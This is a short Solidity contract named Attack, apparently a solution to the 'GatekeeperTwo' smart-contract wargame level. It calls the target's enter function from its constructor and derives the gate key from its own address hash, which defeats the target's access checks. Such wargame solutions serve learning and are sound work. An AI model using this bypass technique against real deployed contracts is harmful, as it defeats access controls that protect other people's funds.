// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    constructor(address _victim) {
        IGatekeeperTwo victim = IGatekeeperTwo(_victim);
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        victim.enter(gateKey);
    }
}